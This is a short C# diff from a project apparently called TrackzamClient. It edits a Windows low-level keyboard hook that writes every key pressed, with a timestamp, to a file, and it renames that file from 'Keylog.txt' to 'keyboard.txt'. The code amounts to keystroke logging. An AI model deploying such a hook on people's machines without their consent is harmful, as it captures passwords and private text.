@@ -44,7 +44,7 @@ namespace TrackzamClient
         {
             if (Directory.Exists(path))
             {
-                _logDir = path + "\\Keylog.txt";
+                _logDir = path + "\\keyboard.txt";
                 return true;
             }
 
@@ -88,7 +88,7 @@ namespace TrackzamClient
             if (nCode >= 0 && wParam == (IntPtr)WM_KEYDOWN)
             {
                 int vkCode = Marshal.ReadInt32(lParam);
-                _writer.WriteLine("{0} {1}", (Keys)vkCode, TrackzamTimer.GetNowClockString());
+                _writer.WriteLine("{0} {1}",TrackzamTimer.GetTimestampString(),(Keys)vkCode);
             }
             return CallNextHookEx(_hookID, nCode, wParam, lParam);
         }
